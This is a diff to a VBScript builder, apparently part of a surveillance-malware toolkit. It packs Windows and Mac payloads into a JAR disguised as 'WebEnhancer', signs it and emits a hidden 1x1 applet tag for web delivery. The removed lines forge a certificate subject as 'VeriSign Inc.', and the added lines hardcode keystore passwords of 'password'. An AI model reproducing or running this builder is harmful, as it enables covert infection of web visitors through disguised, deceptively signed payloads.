@@ -15,6 +15,12 @@ OutputName = WScript.Arguments.Item(2)
 WScript.Echo "Selected payload          : " & Payload
 WScript.Echo "Using temporary directory : " & TmpDir
 WScript.Echo "Output name               : " & OutputName
+
+KeyStore = "applet.keystore"
+KeyStorePassword = "password"
+KeyAlias = "AppletCert"
+KeyPassword = "password"
+
 WScript.Echo
 
 ' Check that temporary directory exists
@@ -33,7 +39,16 @@ AppletCertificate = OutputName & ".cer"
 PayloadWin = Payload & ".exe"
 PayloadMac = Payload
 JarFile =  "WebEnhancer.jar"
-KeyStore = "applet_keystore"
+
+' delete any signed applet with the same name, if exists
+If objFSO.FileExists(SignedApplet) then
+	objFSO.DeleteFile(SignedApplet)
+End If
+
+If not objFSO.FileExists(JarFile) then
+	WScript.Echo "Cannot find the base JAR file " & JarFile
+	WScript.Quit 1
+End If
 
 If not objFSO.FileExists(PayloadWin) then
 	WScript.Echo "Cannot find Windows payload file " & PayloadWin
@@ -54,24 +69,17 @@ WScript.Echo "Embedding Windows payload."
 Ret = WshShell.Run("zip -u " & JarFile & " win", 0, true)
 
 WScript.Echo "Embedding Mac payload."
-Ret = WshShell.Run("zip -u " & JarFile & " mac", 0, true)
-
-WScript.Echo "Creating certificate."
-Ret = WshShell.Run("keytool -genkey -alias signapplet -dname ""CN=VeriSign Inc., O=Default, C=US"" -validity 18250 -keystore " & KeyStore & " -keypass key_password -storepass store_password", 0, true)
-If not objFSO.FileExists(KeyStore) then
-	WScript.Echo "Cannot find " & KeyStore
-	WScript.Quit 1
-End If
+Ret = WshShell.Run("zip -u " & JarFile & " mac", 0, true) 
 
 WScript.Echo "Signing applet."
-Ret = WshShell.Run("jarsigner -keystore " & KeyStore & " -storepass store_password -keypass key_password -signedjar " & SignedApplet & " " & JarFile & " signapplet", 0, true)
+Ret = WshShell.Run("jarsigner -keystore %RCSDB_PATH%\\res\\cert\\" & KeyStore & " -storepass " & KeyStorePassword & " -keypass " & KeyPassword & " -signedjar " & SignedApplet & " " & JarFile & " " & KeyAlias, 0, true)
 If not objFSO.FileExists(SignedApplet) then
 	WScript.Echo "Cannot find " & SignedApplet
 	WScript.Quit 1
 End If
 
 WScript.Echo "Exporting certificate."
-Ret = WshShell.Run("keytool -export -keystore " & KeyStore & " -storepass store_password -alias signapplet -file " & AppletCertificate, 0, true)
+Ret = WshShell.Run("keytool -export -keystore %RCSDB_PATH%\\res\\cert\\" & KeyStore & " -storepass " & KeyStorePassword & " -alias " & KeyAlias & " -file " & AppletCertificate, 0, true)
 If not objFSO.FileExists(AppletCertificate) then
 	WScript.Echo "Cannot find " & AppletCertificate
 	WScript.Quit 1
@@ -83,3 +91,4 @@ objFile.WriteLine("<applet width='1' height='1' code=WebEnhancer archive='" & Si
 
 WScript.Echo
 WScript.Echo "Done."
+
